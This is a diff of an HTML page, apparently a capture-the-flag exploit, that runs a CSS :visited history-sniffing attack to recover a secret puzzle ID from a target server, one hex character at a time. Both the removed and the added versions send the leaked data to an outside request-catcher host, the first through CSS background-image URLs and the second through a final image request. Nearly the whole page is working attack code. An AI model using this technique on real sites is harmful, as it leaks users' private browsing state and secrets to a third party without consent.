@@ -1,77 +1,58 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSS Leak</title>
+  <title>CTF CSS Leak Debug</title>
   <style>
-    .checklink {
-      color: black;
-    }
-    .checklink:visited {
-      color: red;
-    }
+    .checklink { color: black; margin: 2px; padding: 2px 4px; border: 1px solid #ccc; display: inline-block; font-family: monospace; font-size: 0.9em; }
+    .checklink:visited { color: red; }
+    #container { padding: 10px; background: #f5f5f5; border: 1px solid #ddd; max-width: 100%; overflow-x: auto; white-space: nowrap; }
+    #log { margin-top: 1em; background: #222; color: #0f0; padding: 10px; font-family: monospace; height: 200px; overflow-y: auto; }
   </style>
 </head>
 <body>
-  <h1>Leak in progress…</h1>
+  <h1>Leak in progress...</h1>
+  <div id="container"></div>
   <pre id="log"></pre>
-
   <script>
   (async () => {
-    const BASE = "http://34.146.134.179:3000/puzzle?id=";
-    const LEAK = "https://singetu0096.requestcatcher.com";
-    const HEX  = "0123456789abcdef".split("");
+    const BASE    = "http://34.146.134.179:3000/puzzle?id=";
+    const CATCHER = "https://singetu0096.requestcatcher.com";
+    const HEX     = "0123456789abcdef".split("");
     const MAX_POS = 32;
-
     let prefix = "";
-    const logEl = document.getElementById("log");
-
+    const container = document.getElementById("container");
+    const logEl     = document.getElementById("log");
     for (let pos = 0; pos < MAX_POS; pos++) {
       let found = null;
-
-      const style = document.createElement("style");
+      let style = document.querySelector("#leak-style");
+      if (style) style.remove();
+      style = document.createElement("style");
       style.id = "leak-style";
-      style.textContent = HEX.map(c => {
-        return `
-a[href^="${BASE}${prefix}${c}"]:visited::after {
-  content: '';
-  display: block;
-  width: 1px; height: 1px;
-  background-image: url("${LEAK}?pos=${pos}&hex=${c}");
-}`;
-      }).join("\n");
+      style.textContent = HEX.map(c => `a.checklink[href^="${BASE}${prefix}${c}"]:visited {}`).join("\n");
       document.head.appendChild(style);
-
-      for (const c of HEX) {
+      container.textContent = "";
+      HEX.forEach(c => {
         const a = document.createElement("a");
-        a.href = BASE + prefix + c;
+        a.href      = BASE + prefix + c;
         a.className = "checklink";
-        a.textContent = `[pos=${pos}] try=${c}`;
-        a.style.position = "absolute";
-        a.style.left = "-9999px";
-        document.body.appendChild(a);
-
-        const color = getComputedStyle(a).color;
-        document.body.removeChild(a);
-
-        if (color === "rgb(255, 0, 0)") {
-          found = c;
-          logEl.textContent += `pos ${pos} → ${c}\n`;
+        a.textContent = `[${pos}] ${c}`;
+        container.appendChild(a);
+      });
+      await new Promise(requestAnimationFrame);
+      for (const a of container.querySelectorAll("a")) {
+        if (getComputedStyle(a).color === "rgb(255, 0, 0)") {
+          found = a.textContent.split(" ")[1];
+          logEl.textContent += `pos ${pos} → ${found}\n`;
           break;
         }
-        await new Promise(r => setTimeout(r, 20));
       }
-
-      document.head.removeChild(style);
-
-      if (found === null) {
-        logEl.textContent += `pos ${pos} → (no match)\n`;
-        break;
-      }
+      style.remove();
+      if (!found) break;
       prefix += found;
     }
-
-    logEl.textContent += `\nRecovered ID prefix: ${prefix}\n`;
+    logEl.textContent += `\nRecovered ID: ${prefix}\n`;
+    new Image().src = `${CATCHER}?fullid=${encodeURIComponent(prefix)}`;
   })();
   </script>
 </body>
